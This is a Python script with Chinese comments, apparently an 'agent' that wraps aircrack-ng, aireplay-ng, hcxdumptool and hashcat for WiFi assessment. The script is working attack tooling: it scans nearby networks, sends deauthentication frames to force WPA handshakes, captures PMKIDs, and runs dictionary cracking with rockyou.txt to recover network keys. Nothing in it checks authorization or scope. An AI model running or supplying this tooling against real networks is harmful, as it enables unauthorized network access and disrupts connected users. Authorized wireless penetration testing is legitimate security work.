#!/usr/bin/env python3
"""使用 aircrack-ng 子进程封装进行 WiFi 密码破解评估的 Agent。"""

import subprocess
import sys
import os
import re
import time
import signal
from datetime import datetime


def check_tools():
    """验证所需工具是否已安装。"""
    tools = {}
    for tool in ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "hashcat"]:
        result = subprocess.run(
            ["which", tool], capture_output=True, text=True
        )
        tools[tool] = result.stdout.strip() if result.returncode == 0 else None
    return tools


def list_interfaces():
    """列出无线接口。"""
    result = subprocess.run(
        ["iw", "dev"], capture_output=True, text=True
    )
    interfaces = re.findall(r"Interface\s+(\S+)", result.stdout)
    return interfaces


def enable_monitor_mode(iface="wlan0"):
    """在无线接口上启用监听模式。"""
    subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)
    result = subprocess.run(
        ["airmon-ng", "start", iface], capture_output=True, text=True
    )
    mon_match = re.search(r"monitor mode .* enabled on (\S+)", result.stdout)
    mon_iface = mon_match.group(1) if mon_match else f"{iface}mon"
    return {"monitor_interface": mon_iface, "output": result.stdout.strip()}


def scan_networks(mon_iface="wlan0mon", duration=15, output_prefix="/tmp/scan"):
    """扫描附近的无线网络。"""
    proc = subprocess.Popen(
        ["airodump-ng", mon_iface, "-w", output_prefix, "--output-format", "csv"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )
    time.sleep(duration)
    proc.send_signal(signal.SIGINT)
    proc.wait()
    csv_file = f"{output_prefix}-01.csv"
    networks = []
    if os.path.exists(csv_file):
        with open(csv_file, "r", errors="ignore") as f:
            lines = f.readlines()
        in_ap_section = True
        for line in lines[2:]:
            if not line.strip() or "Station MAC" in line:
                in_ap_section = False
                continue
            if not in_ap_section:
                continue
            fields = [f.strip() for f in line.split(",")]
            if len(fields) >= 14:
                bssid = fields[0]
                channel = fields[3]
                encryption = fields[5]
                essid = fields[13]
                power = fields[8]
                if bssid and len(bssid) == 17:
                    networks.append({
                        "bssid": bssid, "channel": channel,
                        "encryption": encryption, "essid": essid,
                        "power": power,
                    })
    return networks


def capture_handshake(mon_iface, bssid, channel, output_prefix="/tmp/handshake",
                      timeout=120):
    """从目标网络捕获 WPA 握手包。"""
    proc = subprocess.Popen(
        ["airodump-ng", "-c", str(channel), "--bssid", bssid,
         "-w", output_prefix, mon_iface],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )
    time.sleep(5)
    subprocess.run(
        ["aireplay-ng", "-0", "5", "-a", bssid, mon_iface],
        capture_output=True, timeout=30
    )
    time.sleep(timeout)
    proc.send_signal(signal.SIGINT)
    proc.wait()
    cap_file = f"{output_prefix}-01.cap"
    handshake_captured = False
    if os.path.exists(cap_file):
        check = subprocess.run(
            ["aircrack-ng", cap_file], capture_output=True, text=True, timeout=10
        )
        if "1 handshake" in check.stdout:
            handshake_captured = True
    return {
        "capture_file": cap_file,
        "handshake_captured": handshake_captured,
        "bssid": bssid,
        "channel": channel,
    }


def try_pmkid_capture(mon_iface, bssid, channel, timeout=30):
    """使用 hcxdumptool 尝试 PMKID 捕获。"""
    output_file = "/tmp/pmkid.pcapng"
    try:
        proc = subprocess.Popen(
            ["hcxdumptool", "-i", mon_iface, "-o", output_file,
             "--enable_status=1", "--filtermode=2",
             f"--filterlist_ap={bssid}"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        time.sleep(timeout)
        proc.send_signal(signal.SIGINT)
        proc.wait()
        hash_file = "/tmp/pmkid_hash.txt"
        subprocess.run(
            ["hcxpcapngtool", "-o", hash_file, output_file],
            capture_output=True
        )
        if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
            return {"pmkid_captured": True, "hash_file": hash_file}
    except FileNotFoundError:
        pass
    return {"pmkid_captured": False}


def crack_with_aircrack(cap_file, wordlist="/usr/share/wordlists/rockyou.txt"):
    """使用 aircrack-ng 和字典攻击破解 WPA 握手包。"""
    if not os.path.exists(wordlist):
        return {"error": f"字典文件未找到：{wordlist}"}
    result = subprocess.run(
        ["aircrack-ng", cap_file, "-w", wordlist],
        capture_output=True, text=True, timeout=3600
    )
    key_match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", result.stdout)
    if key_match:
        return {"cracked": True, "key": key_match.group(1), "tool": "aircrack-ng"}
    return {"cracked": False, "tool": "aircrack-ng"}


def crack_with_hashcat(hash_file, wordlist="/usr/share/wordlists/rockyou.txt",
                       hash_mode=22000):
    """使用 hashcat 进行 GPU 加速 WPA 破解。"""
    if not os.path.exists(wordlist):
        return {"error": f"字典文件未找到：{wordlist}"}
    try:
        result = subprocess.run(
            ["hashcat", "-m", str(hash_mode), hash_file, wordlist,
             "--force", "-o", "/tmp/hashcat_cracked.txt"],
            capture_output=True, text=True, timeout=7200
        )
        cracked_file = "/tmp/hashcat_cracked.txt"
        if os.path.exists(cracked_file) and os.path.getsize(cracked_file) > 0:
            with open(cracked_file) as f:
                return {"cracked": True, "result": f.read().strip(), "tool": "hashcat"}
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass
    return {"cracked": False, "tool": "hashcat"}


def disable_monitor_mode(mon_iface="wlan0mon"):
    """禁用监听模式并恢复托管模式。"""
    subprocess.run(["airmon-ng", "stop", mon_iface], capture_output=True)
    subprocess.run(["systemctl", "restart", "NetworkManager"], capture_output=True)
    return {"restored": True}


def print_report(networks, handshake, crack_result):
    """打印 WiFi 安全评估报告。"""
    print("WiFi 安全评估报告")
    print("=" * 50)
    print(f"日期：{datetime.now().isoformat()}")
    print(f"\n已发现网络：{len(networks)}")
    for n in networks[:10]:
        print(f"  {n['essid']:25s} {n['bssid']} ch:{n['channel']:>3s} {n['encryption']}")
    print(f"\n握手包捕获：{'成功' if handshake.get('handshake_captured') else '失败'}")
    print(f"  BSSID：{handshake.get('bssid')}")
    print(f"  文件：{handshake.get('capture_file')}")
    if crack_result:
        if crack_result.get("cracked"):
            print(f"\n密码已破解：是")
            print(f"  密钥：{crack_result.get('key', crack_result.get('result', 'N/A'))}")
            print(f"  工具：{crack_result['tool']}")
            print(f"  风险：严重 - 密码短语强度不足")
        else:
            print(f"\n密码已破解：否（密码短语可抵御字典攻击）")


if __name__ == "__main__":
    iface = sys.argv[1] if len(sys.argv) > 1 else "wlan0"
    tools = check_tools()
    missing = [t for t, p in tools.items() if not p]
    if missing:
        print(f"缺少工具：{', '.join(missing)}")
        sys.exit(1)
    print(f"正在 {iface} 上启动 WiFi 评估...")
